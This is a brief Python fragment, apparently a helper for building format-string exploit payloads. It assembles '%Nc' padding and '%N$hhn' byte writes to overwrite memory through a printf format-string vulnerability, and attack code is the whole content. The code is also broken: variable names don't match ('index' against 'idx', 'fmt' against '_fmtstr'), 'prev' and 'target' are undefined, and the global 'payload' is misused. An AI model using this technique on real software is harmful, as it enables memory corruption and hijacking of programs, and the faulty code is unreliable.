payload = ""

def _fmtstr(prev_size,val,index):
    result = ""
    if prev_size < val:
        result += "%" + str(val - prev_size) + "c"
    elif prev_size == val:
        result += ""
    else:
        result += "%" + str(val - prev_size +256 ) + "c"
    result += "%" + str(idx) + "$hhn"
    return result

def fmtstr(prev_size,data,write_num,write_size):
    for loop in range(len(list(data.keys()))):
        for i in range(write_num):
            payload += fmt(prev,(target >> i*8) & 0xff,22+i)
            prev = (target >> i*8) & 0xff


